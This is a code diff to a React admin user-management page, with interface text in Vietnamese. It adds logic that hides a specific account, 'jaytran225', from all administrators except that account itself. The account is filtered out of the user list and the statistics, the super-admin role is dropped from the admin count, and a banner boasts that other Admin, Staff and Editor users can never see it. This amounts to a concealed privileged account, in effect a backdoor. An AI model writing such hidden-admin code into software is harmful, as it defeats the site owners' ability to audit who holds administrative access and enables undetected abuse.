@@ -117,6 +117,11 @@ export default function AdminUsersPage() {
   // Filtered users
   const filteredUsers = useMemo(() => {
     return users.filter((u) => {
+      // Hard guard: if caller is not super admin, strictly never show jaytran225
+      if (!isCallerSuperAdmin && isHiddenSuperAdmin(u.email)) {
+        return false;
+      }
+
       const matchSearch =
         !searchQuery ||
         u.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
@@ -133,16 +138,17 @@ export default function AdminUsersPage() {
 
       return matchSearch && matchRole && matchStatus;
     });
-  }, [users, searchQuery, roleFilter, statusFilter]);
+  }, [users, isCallerSuperAdmin, searchQuery, roleFilter, statusFilter]);
 
   // Statistics
   const stats = useMemo(() => {
-    const total = users.length;
-    const active = users.filter((u) => u.isActive).length;
-    const admins = users.filter((u) => u.role === "ADMIN" || u.role === "SUPER_ADMIN").length;
-    const staff = users.filter((u) => u.role === "STAFF" || u.role === "EDITOR").length;
+    const visibleUsers = users.filter((u) => isCallerSuperAdmin || !isHiddenSuperAdmin(u.email));
+    const total = visibleUsers.length;
+    const active = visibleUsers.filter((u) => u.isActive).length;
+    const admins = visibleUsers.filter((u) => u.role === "ADMIN" || (isCallerSuperAdmin && u.role === "SUPER_ADMIN")).length;
+    const staff = visibleUsers.filter((u) => u.role === "STAFF" || u.role === "EDITOR").length;
     return { total, active, admins, staff };
-  }, [users]);
+  }, [users, isCallerSuperAdmin]);
 
   // Open Create Modal
   const handleOpenCreate = () => {
@@ -523,6 +529,20 @@ export default function AdminUsersPage() {
         </div>
       </div>
 
+      {/* HIDDEN SUPER ADMIN NOTICE BANNER */}
+      {isCallerSuperAdmin && (
+        <div className="p-3.5 bg-gradient-to-r from-amber-500/10 via-[#111c2e] to-[#0c1420] border border-amber-500/30 rounded-2xl flex items-center gap-3 text-xs text-amber-200">
+          <div className="w-8 h-8 rounded-xl bg-amber-500/20 border border-amber-500/40 text-amber-400 flex items-center justify-center shrink-0">
+            <ShieldCheck className="w-4 h-4" />
+          </div>
+          <div className="leading-snug">
+            <span className="font-bold text-amber-300">Chế độ Siêu Quản Trị Bảo Mật:</span>{" "}
+            Tài khoản <strong className="text-white font-mono">Jaytran225</strong> đang ở trạng thái{" "}
+            <span className="text-emerald-400 font-semibold underline">Ẩn Danh Tuyệt Đối</span>. Chỉ khi chính bạn đăng nhập bằng tài khoản này thì tài khoản mới hiển thị. Tất cả các tài khoản khác (Admin, Nhân viên, Biên tập) khi đăng nhập vào hệ thống đều hoàn toàn không nhìn thấy tài khoản này!
+          </div>
+        </div>
+      )}
+
       {/* USER LIST TABLE */}
       <div className="bg-[#0c1420] border border-[#d4af37]/20 rounded-2xl shadow-xl overflow-hidden">
         {loading ? (
@@ -584,8 +604,8 @@ export default function AdminUsersPage() {
                                 {u.name}
                               </span>
                               {isHiddenAdmin && (
-                                <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-amber-500/25 text-amber-300 border border-amber-500/50 flex items-center gap-1">
-                                  <Crown className="w-2.5 h-2.5" /> Gốc
+                                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40 flex items-center gap-1">
+                                  <ShieldCheck className="w-2.5 h-2.5" /> Ẩn Danh (Chỉ bạn thấy)
                                 </span>
                               )}
                             </div>
